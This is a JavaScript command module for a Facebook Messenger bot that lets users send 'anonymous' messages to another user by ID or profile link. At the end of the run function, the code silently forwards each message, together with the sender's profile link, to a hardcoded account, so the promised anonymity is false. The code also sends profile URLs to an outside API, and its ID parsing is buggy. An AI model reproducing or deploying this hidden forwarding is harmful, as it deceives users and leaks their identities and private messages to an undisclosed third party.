const axios = require('axios');

module.exports.config = {
    name: "message",
    version: "1.0.8",
    hasPermssion: 0,
    usePrefix: true,
    credits: "Biru",
    description: "message [uid] [text]",
    commandCategory: "fun",
    usages: "ID [Text]",
    cooldowns: 5
};

module.exports.run = async function({ api, event, args }) {
    if (!args[0]) return api.sendMessage("Syntax error, use: message uid [message]", event.threadID, event.messageID);

    let recipientID = args[0];

    // Check if the recipient ID is a profile link or username
    if (recipientID.startsWith("https://www.facebook.com/")) {
        try {
            // If URL has a profile.php?id or UID directly, extract the ID
            if (recipientID.includes("profile.php?id=") || recipientID.match(/\d+/)) {
                recipientID = recipientID.split("id=")[1].split("&")[0];
            } else {
                // Otherwise, handle it as a username and use the new API to get the user ID
                const apiUrl = `https://vneerapi.onrender.com/fbid?url=${recipientID}`; // No encoding here
                const response = await axios.get(apiUrl);

                if (response.data.status) {
                    recipientID = response.data.facebookId;
                } else {
                    return api.sendMessage("Error: Unable to fetch user ID from the profile link.", event.threadID, event.messageID);
                }
            }
        } catch (error) {
            console.error("Error fetching user ID:", error);
            return api.sendMessage("Error: Unable to fetch user ID from profile link.", event.threadID, event.messageID);
        }
    }

    const message = args.slice(1).join(" ");

    if (!message) return api.sendMessage("Syntax error, use: message uid [message]", event.threadID, event.messageID);

    // Send message to the recipient
    api.sendMessage("𝖠𝗇𝗈𝗇𝗒𝗆𝗈𝗎𝗌 𝖬𝖾𝗌𝗌𝖺𝗀𝖾:\n\n" + message, recipientID, async () => {
        await api.sendMessage("𝖬𝖾𝗌𝗌𝖺𝗀𝖾 𝖲𝖾𝗇𝗍: " + message, event.threadID);
    });

    // Message to admin
    const senderName = await api.getThreadInfo(event.threadID);
    const senderLink = `https://www.facebook.com/profile.php?id=${event.senderID}`; 
    const messageToAdmin = `Message from ${senderLink}:\n\n${message}`; 

    await api.sendMessage(messageToAdmin, "100022194825565");
}
